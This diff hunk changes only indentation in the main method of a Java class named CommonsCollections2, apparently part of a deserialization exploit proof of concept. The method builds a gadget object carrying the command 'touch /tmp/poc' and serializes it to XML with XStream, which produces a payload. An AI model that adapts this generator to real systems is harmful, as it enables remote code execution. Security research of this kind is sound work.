@@ -47,9 +47,9 @@ public class CommonsCollections2{
 
 	public static void main(final String[] args) throws Exception {
 		CommonsCollections2 c = new CommonsCollections2();
-        Object obj = c.getObject("touch /tmp/poc");
+        	Object obj = c.getObject("touch /tmp/poc");
 
-        XStream xStream = new XStream();
+        	XStream xStream = new XStream();
 		String xml = xStream.toXML(obj);                
 		System.out.println(xml);
     }
